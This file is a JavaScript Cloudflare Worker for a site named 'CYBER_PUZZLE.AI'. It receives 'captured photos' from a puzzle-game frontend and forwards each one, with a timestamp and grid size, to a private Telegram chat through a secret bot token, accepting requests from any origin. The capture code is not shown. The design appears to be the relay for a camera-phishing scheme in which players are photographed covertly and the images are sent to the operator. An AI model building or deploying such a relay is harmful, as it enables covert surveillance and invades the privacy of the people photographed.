/**
 * Cloudflare Worker for CYBER_PUZZLE.AI Telegram Photo Delivery
 * 
 * Secure serverless endpoint that receives captured photos from the frontend
 * and forwards them to Telegram Bot API using server-side secrets.
 * 
 * Environment Secrets (NEVER exposed to frontend):
 * - TELEGRAM_BOT_TOKEN
 * - TELEGRAM_CHAT_ID
 */

export default {
    async fetch(request, env, ctx) {
        // Handle CORS preflight
        if (request.method === 'OPTIONS') {
            return new Response(null, {
                status: 204,
                headers: {
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'POST, OPTIONS',
                    'Access-Control-Allow-Headers': 'Content-Type',
                    'Access-Control-Max-Age': '86400',
                },
            });
        }

        // Only allow POST requests
        if (request.method !== 'POST') {
            return new Response(JSON.stringify({ error: 'Method not allowed' }), {
                status: 405,
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*',
                },
            });
        }

        // Check if secrets are configured
        if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
            console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment secrets');
            return new Response(JSON.stringify({ error: 'Server configuration error: missing Telegram secrets' }), {
                status: 500,
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*',
                },
            });
        }

        try {
            const formData = await request.formData();
            const photo = formData.get('photo');
            const timestamp = formData.get('timestamp') || new Date().toISOString();
            const gridSize = formData.get('gridSize') || '3x3';

            if (!photo) {
                return new Response(JSON.stringify({ error: 'No photo provided in request' }), {
                    status: 400,
                    headers: {
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*',
                    },
                });
            }

            // Format timestamp for display caption
            let formattedTime = timestamp;
            try {
                formattedTime = new Date(timestamp).toLocaleString('en-US', {
                    dateStyle: 'medium',
                    timeStyle: 'medium'
                });
            } catch (e) {
                formattedTime = timestamp;
            }

            const caption = `📸 CYBER_PUZZLE.AI\nNew captured photo\nTime: ${formattedTime}\nGrid: ${gridSize}`;

            // Build Telegram Bot API form data
            const tgFormData = new FormData();
            tgFormData.append('chat_id', env.TELEGRAM_CHAT_ID);
            tgFormData.append('photo', photo);
            tgFormData.append('caption', caption);

            // Forward to Telegram Bot API sendPhoto endpoint
            const tgUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendPhoto`;
            const tgResponse = await fetch(tgUrl, {
                method: 'POST',
                body: tgFormData,
            });

            const tgResult = await tgResponse.json();

            if (!tgResponse.ok || !tgResult.ok) {
                console.error('Telegram API error:', tgResult);
                return new Response(JSON.stringify({
                    error: 'Failed to deliver to Telegram',
                    details: tgResult.description || 'Unknown Telegram API error'
                }), {
                    status: 502,
                    headers: {
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*',
                    },
                });
            }

            return new Response(JSON.stringify({
                success: true,
                message: 'Photo delivered to Telegram successfully'
            }), {
                status: 200,
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*',
                },
            });
        } catch (error) {
            console.error('Worker processing error:', error);
            return new Response(JSON.stringify({
                error: 'Internal server error',
                message: error.message
            }), {
                status: 500,
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*',
                },
            });
        }
    },
};
